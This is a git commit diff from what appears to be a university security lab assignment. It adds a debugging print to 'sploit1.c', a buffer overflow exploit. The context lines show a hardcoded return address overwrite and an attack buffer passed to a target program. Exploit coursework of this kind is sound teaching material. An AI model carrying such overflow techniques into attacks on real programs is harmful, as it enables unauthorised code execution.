5466f7b63f52f7268dbb809328bca4cb3a0d6858
Mahsa Naserifar <mahsa@render.com>
2020-01-29 20:19:18 -0500

    Test print

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -26,6 +26,8 @@ main ( int argc, char * argv[] )
 	*ret_address = 0x2021fe10;
 	attack_buffer[BUF_SIZE - 1] = '\0';
 
+	printf("&attack_buffer[120] as hex: %u\n",&attack_buffer[120]);
+
 	args[0] = TARGET;
 	args[1] = attack_buffer;
 	args[2] = NULL;
